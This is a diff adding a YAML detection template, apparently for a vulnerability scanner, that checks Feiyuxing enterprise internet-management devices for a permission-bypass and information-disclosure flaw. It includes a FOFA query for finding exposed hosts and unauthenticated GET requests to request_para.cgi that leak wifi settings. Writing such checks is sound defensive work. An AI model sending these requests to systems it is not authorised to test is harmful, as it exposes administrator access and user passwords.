@@ -1,0 +1,31 @@
+id: feiyuxing-request-para-bypass-disclosure
+
+info:
+  name: 飞鱼星 企业级智能上网行为管理系统 权限绕过信息泄露漏洞
+  author: zan8in
+  severity: high
+  description: |
+    飞鱼星 企业级智能上网行为管理系统 存在权限绕过以及信息泄露漏洞，可以获取管理员权限以及用户密码
+    fofa: title="飞鱼星企业级智能上网行为管理系统"
+  reference:
+    - https://mp.weixin.qq.com/s/HgwGxIiIj4XrvNS_AvoruA
+  tags: cve,cve2023,bypass,disclosure
+  created: 2023/05/26
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /request_para.cgi?parameter=wifi_get_5g_host
+    expression: response.status == 200 && response.body.bcontains(b'"wl_enable_5g":') && response.body.bcontains(b'"wl_hide_5g":')
+  r1:
+    request:
+      method: GET
+      path: /request_para.cgi?parameter=wifi_info
+    expression: response.status == 200 && response.body.bcontains(b'"wl_enable_2g":') && response.body.bcontains(b'"wl_enable_5g":')
+  r2:
+    request:
+      method: GET
+      path: /request_para.cgi?parameter=wifi_info
+    expression: response.status == 200 && response.body.bcontains(b'"wl_enable_2g":') && response.body.bcontains(b'"wl_hide_2g":')
+expression: r0() || r1() || r2()
